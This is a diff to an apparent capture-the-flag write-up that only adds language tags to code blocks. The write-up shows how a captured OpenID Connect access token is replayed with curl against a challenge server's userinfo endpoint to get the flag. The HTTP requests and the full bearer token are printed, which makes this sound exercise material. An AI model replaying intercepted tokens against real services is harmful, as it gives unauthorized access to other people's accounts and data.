@@ -15,7 +15,7 @@ To find the flag we have to find the protected user profile data first. Let's an
 
 We are lucky because we can see an authorization request and following response containing an access token.
 
-```
+```http
 GET /giftlogistics/authorize?response_type=token%20id_token&client_id=a75b4722-141d-4c00-b65c-5dc279146b60&scope=openid+profile&redirect_uri=http%3A%2F%2Ftransporter.hacking-lab.com%2Fclient&nonce=196f7b9ca4e9c&state=e6ec344ec594 HTTP/1.1
 Host: challenges.hackvent.hacking-lab.com:7240
 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0
@@ -66,7 +66,7 @@ To get the flag we have find endpoint of the user info service. Let's dig into t
 
 There's an interesting request to OpenID configuration which might be helpful.
 
-```
+```http
 GET /giftlogistics/.well-known/openid-configuration HTTP/1.1
 Host: challenges.hackvent.hacking-lab.com:7240
 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0
@@ -97,7 +97,7 @@ http://challenges.hackvent.hacking-lab.com:7240/giftlogistics/userinfo
 
 The last thing to do is to call this endpoint with the captured access token.
 
-```
+```bash
 $ curl http://challenges.hackvent.hacking-lab.com:7240/giftlogistics/userinfo \
   -H 'authorization: Bearer eyJraWQiOiJyc2ExIiwiYWxnIjoiUlMyNTYifQ.eyJzdWIiOiJzYW50YSIsImF6cCI6ImE3NWI0NzIyLTE0MWQtNGMwMC1iNjVjLTVkYzI3OTE0NmI2MCIsImlzcyI6Imh0dHA6XC9cL2NoYWxsZW5nZXMuaGFja3ZlbnQuaGFja2luZy1sYWIuY29tOjcyNDBcL2dpZnRsb2dpc3RpY3NcLyIsImV4cCI6MTUyNjkzNjkzNiwiaWF0IjoxNTExMzg0OTM2LCJqdGkiOiI4MTlmNWYzZC1hN2M3LTQ0YTktYmI5Ni0wZmQ4MmY0YjdlNzUifQ.U9Hv66701DtUb8zeqOo45JVbzC3yhKJhsQ_q7N20rdLn5-uovYzMWjhxY8I9oPQkv3s5iDDsx1GIUbnOkC8l__oj_uqptG0BPbRfD2K1blKpbXQt3yxD1pB63aHw5LRAp10ia0MNe8_eo-qzi9d58CVYY_XOtTRH8Ic_tP5lpXVaImi8miYFY2XqR1TuFM-cUjIMUYT9Ik8rwZAEbLO_1UAWPuQUpi0_Z6N0r3hKoIRSlknmmg8A5PunL2I0qFyICUm0cqb4fieBZ34R4117LmyQY_XvzKogIaLegDIgbp22hTGHPAdziEloYYaP5uc_aEnfo0eNvY7QLPNy1dDs-Q'
 {"sub":"HV17-eUOF-mPJY-ruga-fUFq-EhOx","name":"Reginald Thumblewood","preferred_username":"santa"}
